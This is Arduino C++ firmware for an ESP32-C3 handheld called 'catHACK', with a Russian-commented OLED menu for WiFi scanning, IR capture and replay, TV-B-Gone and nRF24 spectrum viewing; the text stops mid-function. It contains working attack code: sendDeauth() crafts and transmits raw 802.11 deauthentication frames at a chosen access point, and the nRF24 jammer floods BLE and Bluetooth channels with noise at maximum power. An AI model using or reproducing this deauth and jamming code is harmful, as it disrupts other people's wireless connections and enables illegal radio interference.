/*
 * =====================================================================
 *  catHACK v4.3 – Полностью развёрнутая стабильная версия
 *  Без GyverOLED, только Adafruit_SSD1306 и Adafruit_GFX
 *  ESP32-C3 | OLED (SDA=8, SCL=9) | Кнопки (UP=20, DOWN=1, OK=0)
 *  IR LED на GPIO21, IR приёмник на GPIO5, nRF24, TV-B-Gone, сохранение
 * =====================================================================
 */

#include <EEPROM.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <RF24.h>
#include <IRrecv.h>
#include <IRsend.h>
#include <IRutils.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <vector>

// ========================== ПИНЫ ==========================
#define OLED_SDA         8
#define OLED_SCL         9
#define SCREEN_WIDTH     128
#define SCREEN_HEIGHT    64
#define OLED_ADDR        0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define BTN_UP           20
#define BTN_DOWN         1
#define BTN_OK           0

#define RF_CE_PIN        3
#define RF_CSN_PIN       4
#define RF_MOSI_PIN      7
#define RF_SCK_PIN       6
#define RF_MISO_PIN      2

#define IR_RX_PIN        5
#define IR_TX_PIN        21

// ========================== КОНСТАНТЫ ==========================
#define NRF_CHANNELS        80
#define WIFI_CHANNELS       14
#define IR_SLOTS_COUNT      4
#define IR_BUFFER_SIZE      512
#define EEPROM_SIZE_BYTES   512
#define JAM_INTERVAL_MS     5
#define LONG_PRESS_MS       500
#define TVBGONE_CARRIER_HZ  38000
#define TVBGONE_CODE_GAP    200

// ========================== ЧАСТОТЫ ДЛЯ ГЛУШЕНИЯ ==========================
const byte BLUETOOTH_CHANNELS[] = {
  0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,
  20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,
  38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,
  56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,
  74,75,76,77,78,79
};
const int BLUETOOTH_CHANNELS_COUNT = 80;

const byte BLE_CHANNELS[] = {
  0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,
  20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39
};
const int BLE_CHANNELS_COUNT = 40;

// ========================== СТРУКТУРЫ ==========================
struct WiFiNetworkInfo
{
  String ssid;
  int rssi;
  int channel;
  uint8_t bssid[6];
  String bssidString;
  String encryptionType;
};

struct IrSignalData
{
  uint16_t rawBuffer[IR_BUFFER_SIZE];
  uint16_t rawLength;
  String protocolName;
  bool isValid;
};

// ========================== TV-B-Gone КОДЫ (УПРОЩЁННЫЕ) ==========================
struct IrCode
{
  uint8_t freq;
  uint8_t numpairs;
  uint8_t comp;
  const uint16_t *times;
  const uint8_t *codes;
};

const uint16_t sony_times[] = {240, 600, 1200, 600};
const uint8_t sony_codes[] = {0x01, 0x00, 0x00, 0x00};
const IrCode sony_code = {0x13, 2, 2, sony_times, sony_codes};

const IrCode* const NApowerCodes[] = {&sony_code};
const IrCode* const EUpowerCodes[] = {&sony_code};
const uint8_t num_NAcodes = 1;
const uint8_t num_EUcodes = 1;

// ========================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========================
int displayTimeoutSec = 30;
unsigned long lastActivityTime = 0;
bool displayOn = true;
bool needRedraw = true;
unsigned long deviceBootTime = 0;
String statusMsg = "";
unsigned long statusMsgTime = 0;

std::vector<WiFiNetworkInfo> wifiList;
int wifiSelectedIdx = 0;
int wifiScrollOffset = 0;
bool wifiScanning = false;
int wifiPackets[WIFI_CHANNELS + 1] = {0};
int wifiSmooth[WIFI_CHANNELS + 1] = {0};
int currentWifiChan = 1;
bool wifiSpectrumActive = false;
unsigned long totalPackets = 0;
unsigned long lastChanSwitch = 0;
uint8_t targetBSSID[6];
int targetChan = 0;
bool deauthActive = false;
unsigned long lastDeauthTime = 0;

RF24 radio(RF_CE_PIN, RF_CSN_PIN);
int nrfSmooth[NRF_CHANNELS];
int nrfRaw[NRF_CHANNELS];
int nrfFloor[NRF_CHANNELS];
int currentNrfChan = 0;
bool nrfOk = false;
bool nrfCalibrated = false;
unsigned long lastNrfScan = 0;
String nrfErrorMsg = "";

enum BleJammerMode { BLE_JAMMER_OFF, BLE_JAMMER_MODE, BLUETOOTH_JAMMER_MODE };
BleJammerMode jammerMode = BLE_JAMMER_MODE;
bool jamming = false;
unsigned long lastJamTime = 0;

IRrecv* irRx = nullptr;
IRsend* irTx = nullptr;
IrSignalData irSlots[IR_SLOTS_COUNT];
int curIrSlot = 0;
int irTxScroll = 0;
bool irCapturing = false;
bool irTempReady = false;
bool irRxOk = false;
unsigned long irTimeout = 0;
uint16_t tempRaw[IR_BUFFER_SIZE];
uint16_t tempRawLen = 0;
String tempProto;
decode_results irResult;

enum AppState
{
  STATE_MAIN_MENU,
  STATE_WIFI_MENU,
  STATE_WIFI_SCAN,
  STATE_WIFI_SPECTRUM,
  STATE_WIFI_ACTIONS,
  STATE_WIFI_INFO,
  STATE_NRF24_MENU,
  STATE_NRF24_SPECTRUM,
  STATE_NRF24_JAMMER,
  STATE_IR_MENU,
  STATE_IR_CAPTURE,
  STATE_IR_TRANSMIT,
  STATE_IR_ERASE,
  STATE_TVBGONE,
  STATE_SETTINGS_MENU,
  STATE_SYSTEM_INFO,
  STATE_TIMEOUT,
  STATE_RESET_CONFIRM,
  STATE_REBOOT_CONFIRM
};
AppState appState = STATE_MAIN_MENU;

int mainIdx = 0;
int wifiMenuIdx = 0;
int nrfMenuIdx = 0;
int irMenuIdx = 0;
int settingsIdx = 0;
int wifiActionIdx = 0;
int timeoutVal = 30;

const int MAIN_SIZE = 4;
const int WIFI_MENU_SIZE = 3;
const int NRF_MENU_SIZE = 4;
const int IR_MENU_SIZE = 5;
const int SETTINGS_SIZE = 5;
const int WIFI_ACTIONS_SIZE = 4;

unsigned long okPressStart = 0;
bool longPressDetected = false;

uint8_t tvbgone_region = 0;  // 0=NA, 1=EU

// ========================== ПРОТОТИПЫ ФУНКЦИЙ ==========================
void setup();
void loop();
void updateDisplay();
void showMsg(const char* msg);
void setPower(bool on);
void saveTimeout();
void loadTimeout();
void startWifiScan();
void updateWifiSpectrum();
void sendDeauth();
void updateNrfSpectrum();
void startJammer();
void stopJammer();
void updateJammer();
void processIrCapture();
void sendIr(int slot);
void recheckNRF24();
void saveIrSlots();
void loadIrSlots();
void eraseAllIrSlots();
void tvbgone_menu();
void tvbgone_send_all(const IrCode* const* codes, uint8_t num);
void drawHeader(const char* title);
void drawItem(const char* text, bool sel, int line);
void drawMainMenu();
void drawWifiMenu();
void drawWifiScan();
void drawWifiSpectrum();
void drawWifiActions();
void drawWifiInfo();
void drawNrfMenu();
void drawNrfSpectrum();
void drawNrfJammer();
void drawIrMenu();
void drawIrCapture();
void drawIrTransmit();
void drawTvbgone();
void drawSettingsMenu();
void drawSysInfo();
void drawTimeoutMenu();
void drawResetConfirm();
void drawRebootConfirm();

bool btnUp()   { return digitalRead(BTN_UP) == LOW; }
bool btnDown() { return digitalRead(BTN_DOWN) == LOW; }
bool btnOk()   { return digitalRead(BTN_OK) == LOW; }

// ========================== ОСНОВНЫЕ ФУНКЦИИ ==========================
void setup()
{
  delay(500);
  deviceBootTime = millis();
  lastActivityTime = millis();
  Serial.begin(115200);
  Serial.println("\ncatHACK v4.3 Starting");

  loadTimeout();

  Wire.begin(OLED_SDA, OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR))
  {
    for (;;);
  }
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(20, 20);
  display.println("catHACK");
  display.setTextSize(1);
  display.setCursor(45, 45);
  display.println("v4.3");
  display.display();
  delay(1500);

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(IR_TX_PIN, OUTPUT);
  digitalWrite(IR_TX_PIN, LOW);

  // nRF24
  SPI.begin(RF_SCK_PIN, RF_MISO_PIN, RF_MOSI_PIN, RF_CSN_PIN);
  SPI.setFrequency(8000000);
  if (radio.begin(RF_CE_PIN, RF_CSN_PIN) && radio.isChipConnected())
  {
    nrfOk = true;
    nrfErrorMsg = "OK";
    radio.setChannel(42);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setAutoAck(false);
    radio.disableCRC();
    radio.stopListening();
    Serial.println("nRF24 OK");
  }
  else
  {
    nrfOk = false;
    nrfErrorMsg = "not found";
    Serial.println("nRF24 FAIL");
  }

  irRx = new IRrecv(IR_RX_PIN);
  irRx->enableIRIn();
  irRxOk = true;
  irTx = new IRsend(IR_TX_PIN);
  irTx->begin();
  for (int i = 0; i < IR_SLOTS_COUNT; i++)
  {
    irSlots[i].isValid = false;
  }
  loadIrSlots();   // загружаем сохранённые IR сигналы

  WiFi.mode(WIFI_MODE_NULL);
  esp_wifi_start();
  delay(50);

  memset(nrfSmooth, 0, sizeof(nrfSmooth));
  memset(wifiSmooth, 0, sizeof(wifiSmooth));

  appState = STATE_MAIN_MENU;
  needRedraw = true;
  Serial.println("Setup complete");
}

// ========================== НАСТРОЙКИ ==========================
void saveTimeout()
{
  EEPROM.begin(EEPROM_SIZE_BYTES);
  EEPROM.write(0, displayTimeoutSec);
  EEPROM.commit();
  EEPROM.end();
}
void loadTimeout()
{
  EEPROM.begin(EEPROM_SIZE_BYTES);
  displayTimeoutSec = EEPROM.read(0);
  if (displayTimeoutSec == 255 || displayTimeoutSec == 0)
  {
    displayTimeoutSec = 30;
  }
  EEPROM.end();
}
void setPower(bool on)
{
  if (on == displayOn) return;
  displayOn = on;
  if (on)
  {
    display.ssd1306_command(SSD1306_DISPLAYON);
  }
  else
  {
    display.ssd1306_command(SSD1306_DISPLAYOFF);
  }
}
void showMsg(const char* msg)
{
  statusMsg = msg;
  statusMsgTime = millis();
  needRedraw = true;
}

// ========================== IR СЛОТЫ (СОХРАНЕНИЕ В EEPROM) ==========================
void saveIrSlots()
{
  EEPROM.begin(EEPROM_SIZE_BYTES);
  int address = 100;  // используем область EEPROM начиная с адреса 100
  for (int i = 0; i < IR_SLOTS_COUNT; i++)
  {
    EEPROM.write(address++, irSlots[i].isValid ? 1 : 0);
    if (irSlots[i].isValid)
    {
      EEPROM.put(address, irSlots[i].rawLength);
      address += 2;
      EEPROM.put(address, irSlots[i].rawBuffer);
      address += irSlots[i].rawLength * 2;
    }
  }
  EEPROM.commit();
  EEPROM.end();
}
void loadIrSlots()
{
  EEPROM.begin(EEPROM_SIZE_BYTES);
  int address = 100;
  for (int i = 0; i < IR_SLOTS_COUNT; i++)
  {
    uint8_t v = EEPROM.read(address++);
    irSlots[i].isValid = (v == 1);
    if (irSlots[i].isValid)
    {
      EEPROM.get(address, irSlots[i].rawLength);
      address += 2;
      EEPROM.get(address, irSlots[i].rawBuffer);
      address += irSlots[i].rawLength * 2;
    }
  }
  EEPROM.end();
}
void eraseAllIrSlots()
{
  for (int i = 0; i < IR_SLOTS_COUNT; i++)
  {
    irSlots[i].isValid = false;
  }
  saveIrSlots();
  showMsg("All IR slots erased");
}

// ========================== TV-B-Gone ФУНКЦИИ ==========================
void tvbgone_send_all(const IrCode* const* codes, uint8_t num_codes)
{
  ledcSetup(0, TVBGONE_CARRIER_HZ, 8);
  ledcAttachPin(IR_TX_PIN, 0);
  ledcWrite(0, 0);

  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(10, 10);
  display.print("Sending IR codes...");
  display.setCursor(10, 25);
  display.print("Region: ");
  if (tvbgone_region == 0)
    display.print("NA");
  else
    display.print("EU");
  display.drawRect(10, 45, 108, 8, SSD1306_WHITE);
  display.display();

  unsigned long startTime = millis();
  unsigned long nextProgressTime = startTime + 1000;

  for (uint8_t idx = 0; idx < num_codes; idx++)
  {
    const IrCode* code = codes[idx];
    uint8_t numPairs = code->numpairs;
    uint8_t bitComp = code->comp;
    const uint16_t* timePtr = code->times;
    const uint8_t* codePtr = code->codes;

    uint16_t pairs[256];
    uint16_t pCnt = 0;
    uint8_t bits = 0;
    uint8_t bitsLeft = 0;

    for (uint8_t k = 0; k < numPairs; k++)
    {
      uint8_t idxTime = 0;
      for (uint8_t b = 0; b < bitComp; b++)
      {
        if (bitsLeft == 0)
        {
          bits = *codePtr;
          codePtr++;
          bitsLeft = 8;
        }
        bitsLeft--;
        idxTime = (idxTime << 1) | ((bits >> bitsLeft) & 1);
      }
      uint16_t onTime = timePtr[idxTime * 4];
      uint16_t offTime = timePtr[idxTime * 4 + 2];
      pairs[pCnt] = onTime;
      pCnt++;
      pairs[pCnt] = offTime;
      pCnt++;
    }

    // Передача сигнала
    for (uint16_t i = 0; i < pCnt; i += 2)
    {
      ledcWrite(0, 128);
      delayMicroseconds(pairs[i] * 10);
      ledcWrite(0, 0);
      delayMicroseconds(pairs[i + 1] * 10);
      yield();
    }

    // Обновление прогресса (1% в секунду)
    unsigned long now = millis();
    if (now >= nextProgressTime)
    {
      int realPercent = (idx + 1) * 100 / num_codes;
      int elapsedSeconds = (now - startTime) / 1000;
      if (elapsedSeconds > 100) elapsedSeconds = 100;
      int displayPercent = (realPercent < elapsedSeconds) ? realPercent : elapsedSeconds;
      display.fillRect(11, 46, (displayPercent * 108) / 100, 6, SSD1306_WHITE);
      display.setCursor(55, 35);
      display.print(displayPercent);
      display.print("%");
      display.display();
      nextProgressTime = now + 1000;
    }

    delay(TVBGONE_CODE_GAP);
  }

  display.fillRect(11, 46, 108, 6, SSD1306_WHITE);
  display.setCursor(55, 35);
  display.print("100%");
  display.display();

  ledcDetachPin(IR_TX_PIN);
  ledcWrite(0, 0);
  showMsg("Done");
}

void tvbgone_menu()
{
  tvbgone_region = 0;
  while (true)
  {
    drawTvbgone();
    bool up = btnUp();
    bool down = btnDown();
    bool ok = btnOk() && !longPressDetected;
    if (up || down)
    {
      tvbgone_region = !tvbgone_region;
      delay(200);
    }
    if (ok)
    {
      // сохраним регион в EEPROM (ячейка 1)
      EEPROM.begin(EEPROM_SIZE_BYTES);
      EEPROM.write(1, tvbgone_region);
      EEPROM.commit();
      EEPROM.end();
      if (tvbgone_region == 0)
      {
        tvbgone_send_all(NApowerCodes, num_NAcodes);
      }
      else
      {
        tvbgone_send_all(EUpowerCodes, num_EUcodes);
      }
      showMsg("Done!");
      break;
    }
    delay(50);
  }
  appState = STATE_IR_MENU;
  needRedraw = true;
}

// ========================== ЛОГИЧЕСКИЕ ФУНКЦИИ ==========================
void processIrCapture()
{
  if (millis() > irTimeout)
  {
    irCapturing = false;
    needRedraw = true;
    return;
  }
  if (irRx && irRx->decode(&irResult))
  {
    tempRawLen = irResult.rawlen;
    if (tempRawLen > IR_BUFFER_SIZE) tempRawLen = IR_BUFFER_SIZE;
    // Переводим тики библиотеки (обычно 50 мкс) в микросекунды
    for (int i = 0; i < tempRawLen; i++)
    {
      tempRaw[i] = irResult.rawbuf[i] * 50;
    }
    tempProto = String(typeToString(irResult.decode_type, irResult.repeat));
    irTempReady = true;
    irRx->resume();
    needRedraw = true;
  }
}

void sendIr(int slot)
{
  if (!irSlots[slot].isValid) return;
  if (irTx && irRxOk)
  {
    irTx->sendRaw(irSlots[slot].rawBuffer, irSlots[slot].rawLength, 38);
    delay(50);
  }
}

void recheckNRF24()
{
  SPI.begin(RF_SCK_PIN, RF_MISO_PIN, RF_MOSI_PIN, RF_CSN_PIN);
  SPI.setFrequency(8000000);
  if (radio.begin(RF_CE_PIN, RF_CSN_PIN) && radio.isChipConnected())
  {
    nrfOk = true;
    nrfErrorMsg = "OK";
    radio.setChannel(42);
    radio.setPALevel(RF24_PA_MAX, true);
    radio.setAutoAck(false);
    radio.disableCRC();
    radio.stopListening();
    showMsg("nRF24 OK");
  }
  else
  {
    nrfOk = false;
    nrfErrorMsg = "not found";
    showMsg("nRF24 not found");
  }
  needRedraw = true;
}

void startWifiScan()
{
  wifiScanning = true;
  wifiList.clear();
  wifiSelectedIdx = 0;
  wifiScrollOffset = 0;
  needRedraw = true;
  int found = WiFi.scanNetworks();
  for (int i = 0; i < found && i < 50; i++)
  {
    WiFiNetworkInfo net;
    net.ssid = WiFi.SSID(i);
    if (net.ssid.length() == 0) net.ssid = "Hidden";
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);
    uint8_t* bssid = WiFi.BSSID(i);
    memcpy(net.bssid, bssid, 6);
    char buf[18];
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    net.bssidString = String(buf);
    uint8_t enc = WiFi.encryptionType(i);
    if (enc == WIFI_AUTH_OPEN) net.encryptionType = "Open";
    else if (enc == WIFI_AUTH_WEP) net.encryptionType = "WEP";
    else if (enc == WIFI_AUTH_WPA_PSK) net.encryptionType = "WPA";
    else if (enc == WIFI_AUTH_WPA2_PSK) net.encryptionType = "WPA2";
    else net.encryptionType = "Unknown";
    wifiList.push_back(net);
  }
  wifiScanning = false;
  if (wifiList.empty())
    wifiSelectedIdx = -1;
  else
    wifiSelectedIdx = 0;
  needRedraw = true;
}

void updateWifiSpectrum()
{
  if (!wifiSpectrumActive) return;
  if (millis() - lastChanSwitch > 100)
  {
    currentWifiChan = (currentWifiChan % WIFI_CHANNELS) + 1;
    esp_wifi_set_channel(currentWifiChan, WIFI_SECOND_CHAN_NONE);
    lastChanSwitch = millis();
    wifiPackets[currentWifiChan] = 0;
    needRedraw = true;
  }
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++)
  {
    wifiSmooth[ch] = (wifiSmooth[ch] * 7 + wifiPackets[ch] * 3) / 10;
  }
}

void sendDeauth()
{
  WiFi.mode(WIFI_STA);
  esp_wifi_set_channel(targetChan, WIFI_SECOND_CHAN_NONE);
  uint8_t deauth[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
    targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5],
    0x00, 0x00, 0x07, 0x00
  };
  uint8_t mac[6];
  esp_read_mac(mac, ESP_MAC_WIFI_STA);
  for (int i = 0; i < 6; i++)
  {
    deauth[10 + i] = mac[i];
  }
  esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
}

void updateNrfSpectrum()
{
  if (!nrfOk) return;
  if (millis() - lastNrfScan < 10) return;
  lastNrfScan = millis();
  if (!nrfCalibrated)
  {
    for (int ch = 0; ch < NRF_CHANNELS; ch++)
    {
      int minRssi = 100;
      for (int m = 0; m < 10; m++)
      {
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(150);
        int rssi = radio.testCarrier() ? 40 : 15;
        radio.stopListening();
        if (rssi < minRssi) minRssi = rssi;
      }
      nrfFloor[ch] = minRssi;
    }
    nrfCalibrated = true;
    memset(nrfSmooth, 0, sizeof(nrfSmooth));
    needRedraw = true;
    return;
  }
  radio.setChannel(currentNrfChan);
  radio.startListening();
  delayMicroseconds(150);
  int raw = radio.testCarrier() ? 40 : 0;
  raw -= nrfFloor[currentNrfChan];
  if (raw < 0) raw = 0;
  if (raw > 50) raw = 50;
  nrfRaw[currentNrfChan] = raw;
  int recent[5], cnt = 0;
  for (int i = 0; i < 5; i++)
  {
    int idx = (currentNrfChan - i + NRF_CHANNELS) % NRF_CHANNELS;
    if (nrfRaw[idx] > 0 || i == 0)
    {
      recent[cnt++] = nrfRaw[idx];
    }
  }
  for (int i = 0; i < cnt - 1; i++)
  {
    for (int j = i + 1; j < cnt; j++)
    {
      if (recent[i] > recent[j])
      {
        int t = recent[i];
        recent[i] = recent[j];
        recent[j] = t;
      }
    }
  }
  int filtered = recent[cnt / 2];
  nrfSmooth[currentNrfChan] = (nrfSmooth[currentNrfChan] * 7 + filtered * 3) / 10;
  currentNrfChan = (currentNrfChan + 1) % NRF_CHANNELS;
  needRedraw = true;
}

void startJammer()
{
  if (!nrfOk)
  {
    showMsg(nrfErrorMsg.c_str());
    return;
  }
  jamming = true;
  lastJamTime = millis();
  radio.powerUp();
  radio.stopListening();
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false);
  radio.disableCRC();
  if (jammerMode == BLE_JAMMER_MODE)
    showMsg("BLE Jammer ON");
  else
    showMsg("BT Jammer ON");
}

void stopJammer()
{
  jamming = false;
  radio.powerDown();
  showMsg("Jammer OFF");
}

void updateJammer()
{
  if (!jamming) return;
  const char noise[] = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
  if (jammerMode == BLE_JAMMER_MODE)
  {
    for (int i = 0; i < BLE_CHANNELS_COUNT; i++)
    {
      radio.setChannel(BLE_CHANNELS[i]);
      radio.write(&noise, sizeof(noise));
    }
  }
  else
  {
    for (int i = 0; i < BLUETOOTH_CHANNELS_COUNT; i++)
    {
      radio.setChannel(BLUETOOTH_CHANNELS[i]);
      radio.write(&noise, sizeof(noise));
    }
  }
}

// ========================== ОТРИСОВКА МЕНЮ ==========================
void drawHeader(const char* title)
{
  display.fillRect(0, 0, SCREEN_WIDTH, 12, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(2, 3);
  display.print(title);
  display.setTextColor(SSD1306_WHITE);
  display.drawLine(0, 12, SCREEN_WIDTH, 12, SSD1306_WHITE);
}

void drawItem(const char* text, bool sel, int line)
{
  int y = 14 + line * 10;
  if (sel)
  {
    display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(4, y);
    display.print(">");
  }
  else
  {
    display.setTextColor(SSD1306_WHITE);
  }
  display.setCursor(14, y);
  display.print(text);
}

void drawMainMenu()
{
  display.clearDisplay();
  drawHeader("catHACK");
  const char* items[] = {"WiFi", "nRF24", "IR", "Settings"};
  for (int i = 0; i < MAIN_SIZE; i++)
  {
    drawItem(items[i], i == mainIdx, i);
  }
  display.display();
}

void drawWifiMenu()
{
  display.clearDisplay();
  drawHeader("WiFi");
  const char* items[] = {"Scan", "Spectrum", "Back"};
  for (int i = 0; i < WIFI_MENU_SIZE; i++)
  {
    drawItem(items[i], i == wifiMenuIdx, i);
  }
  display.display();
}

void drawWifiScan()
{
  display.clearDisplay();
  drawHeader("WiFi Scan");
  if (wifiScanning)
  {
    display.setCursor(40, 30);
    display.println("Scanning...");
  }
  else if (wifiList.empty())
  {
    display.setCursor(30, 30);
    display.println("No networks");
  }
  else
  {
    int visible = 4;
    if (wifiSelectedIdx < wifiScrollOffset)
      wifiScrollOffset = wifiSelectedIdx;
    if (wifiSelectedIdx >= wifiScrollOffset + visible)
      wifiScrollOffset = wifiSelectedIdx - visible + 1;
    if (wifiScrollOffset < 0)
      wifiScrollOffset = 0;
    if (wifiScrollOffset + visible > (int)wifiList.size())
      wifiScrollOffset = wifiList.size() - visible;
    for (int i = 0; i < visible && wifiScrollOffset + i < (int)wifiList.size(); i++)
    {
      int idx = wifiScrollOffset + i;
      int y = 14 + i * 12;
      if (wifiSelectedIdx == idx)
      {
        display.fillRect(0, y - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
        display.setCursor(2, y);
        display.print(">");
      }
      else
      {
        display.setTextColor(SSD1306_WHITE);
      }
      display.setCursor(12, y);
      String line = wifiList[idx].ssid.substring(0, 10) + " " + String(wifiList[idx].rssi);
      display.print(line);
    }
    int yb = 14 + visible * 12;
    if (wifiSelectedIdx == -1)
    {
      display.fillRect(0, yb - 1, SCREEN_WIDTH, 11, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, yb);
      display.print(">");
    }
    else
    {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(12, yb);
    display.println("Back");
  }
  display.display();
}

void drawWifiSpectrum()
{
  display.clearDisplay();
  drawHeader("WiFi Spectrum");
  int maxV = 5;
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++)
  {
    if (wifiSmooth[ch] > maxV) maxV = wifiSmooth[ch];
  }
  if (maxV < 5) maxV = 5;
  for (int ch = 1; ch <= WIFI_CHANNELS; ch++)
  {
    int x = map(ch, 1, WIFI_CHANNELS, 2, SCREEN_WIDTH - 2);
    int h = map(wifiSmooth[ch], 0, maxV, 0, 35);
    if (h > 0)
    {
      display.drawLine(x, 48 - h, x, 48, SSD1306_WHITE);
    }
  }
  display.drawLine(0, 48, SCREEN_WIDTH, 48, SSD1306_WHITE);
  display.setCursor(2, 52);
  display.printf("Ch:%d", currentWifiChan);
  display.setCursor(70, 52);
  display.printf("Pkt:%d", totalPackets);
  display.display();
}

void drawWifiActions()
{
  display.clearDisplay();
  drawHeader("Actions");
  const char* acts[] = {"Info", "Deauth", "Stop", "Back"};
  for (int i = 0; i < WIFI_ACTIONS_SIZE; i++)
  {
    drawItem(acts[i], i == wifiActionIdx, i);
  }
  if (deauthActive)
  {
    display.fillRect(0, 55, SCREEN_WIDTH, 9, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(15, 56);
    display.print("DEAUTH ON");
  }
  display.display();
}

void drawWifiInfo()
{
  display.clearDisplay();
  drawHeader("Net Info");
  if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size())
  {
    WiFiNetworkInfo& n = wifiList[wifiSelectedIdx];
    display.setCursor(2, 14);
    display.printf("SSID: %s", n.ssid.substring(0, 13).c_str());
    display.setCursor(2, 24);
    display.printf("Ch: %d", n.channel);
    display.setCursor(2, 34);
    display.printf("RSSI: %d dBm", n.rssi);
    display.setCursor(2, 44);
    display.printf("Sec: %s", n.encryptionType.c_str());
  }
  display.setCursor(2, 56);
  display.print("Press=back");
  display.display();
}

void drawNrfMenu()
{
  display.clearDisplay();
  char buf[30];
  sprintf(buf, "nRF24 (%s)", nrfOk ? "OK" : nrfErrorMsg.c_str());
  drawHeader(buf);
  const char* items[] = {"Spectrum", "Jammer", "Recheck", "Back"};
  for (int i = 0; i < NRF_MENU_SIZE; i++)
  {
    drawItem(items[i], i == nrfMenuIdx, i);
  }
  display.display();
}

void drawNrfSpectrum()
{
  display.clearDisplay();
  drawHeader("nRF Spectrum");
  if (!nrfOk)
  {
    display.setCursor(10, 30);
    display.println("nRF24 not found!");
    display.display();
    return;
  }
  int maxV = 1;
  for (int i = 0; i < NRF_CHANNELS; i++)
  {
    if (nrfSmooth[i] > maxV) maxV = nrfSmooth[i];
  }
  if (maxV < 3) maxV = 3;
  for (int x = 0; x < SCREEN_WIDTH; x++)
  {
    int ch = map(x, 0, SCREEN_WIDTH - 1, 0, NRF_CHANNELS - 1);
    int sig = nrfSmooth[ch];
    if (sig < 3) sig = 0;
    int h = map(sig, 0, maxV, 0, 35);
    if (h > 0)
    {
      display.drawLine(x, 48 - h, x, 48, SSD1306_WHITE);
    }
  }
  display.drawLine(0, 48, SCREEN_WIDTH, 48, SSD1306_WHITE);
  display.setCursor(2, 52);
  display.printf("CH:%d", currentNrfChan);
  display.setCursor(70, 52);
  display.printf("%dMHz", 2400 + currentNrfChan);
  display.display();
}

void drawNrfJammer()
{
  display.clearDisplay();
  if (!nrfOk)
  {
    drawHeader("nRF24 Error");
    display.setCursor(10, 30);
    display.println(nrfErrorMsg);
    display.display();
    return;
  }
  char h[30];
  sprintf(h, "%s Jam", jammerMode == BLE_JAMMER_MODE ? "BLE" : "BT");
  if (jamming)
  {
    drawHeader(h);
    display.setTextSize(2);
    display.setCursor(20, 25);
    display.println("JAMMING");
    display.setTextSize(1);
    display.setCursor(2, 56);
    display.println("Hold OK to stop");
  }
  else
  {
    drawHeader(h);
    display.setCursor(15, 25);
    display.printf("Mode: %s", jammerMode == BLE_JAMMER_MODE ? "BLE" : "Bluetooth");
    display.setCursor(15, 37);
    display.printf("nRF24: READY");
    display.setCursor(15, 49);
    display.print("Press start");
    display.setCursor(2, 60);
    display.print("Hold OK=change");
  }
  display.display();
}

void drawIrMenu()
{
  display.clearDisplay();
  drawHeader("IR");
  const char* items[] = {"Capture", "Transmit", "Erase All", "TV-B-Gone", "Back"};
  for (int i = 0; i < IR_MENU_SIZE; i++)
  {
    drawItem(items[i], i == irMenuIdx, i);
  }
  display.display();
}

void drawIrCapture()
{
  display.clearDisplay();
  drawHeader("IR Capture");
  if (irCapturing)
  {
    if (irTempReady)
    {
      display.setCursor(20, 30);
      display.println("Captured!");
    }
    else
    {
      display.setCursor(25, 30);
      display.println("Listening...");
    }
    display.setCursor(15, 42);
    display.printf("Timeout: %ds", (irTimeout - millis()) / 1000);
  }
  else
  {
    display.setCursor(30, 30);
    display.println("Press start");
  }
  display.setCursor(2, 56);
  display.println("Press=save");
  display.display();
}

void drawIrTransmit()
{
  display.clearDisplay();
  drawHeader("IR Transmit");
  for (int i = 0; i < IR_SLOTS_COUNT; i++)
  {
    int y = 14 + i * 10;
    if (i == irTxScroll)
    {
      display.fillRect(0, y - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(2, y);
      display.print(">");
    }
    else
    {
      display.setTextColor(SSD1306_WHITE);
    }
    display.setCursor(12, y);
    display.printf("Slot %d: %s", i, irSlots[i].isValid ? "OK" : "Empty");
  }
  int yb = 14 + IR_SLOTS_COUNT * 10;
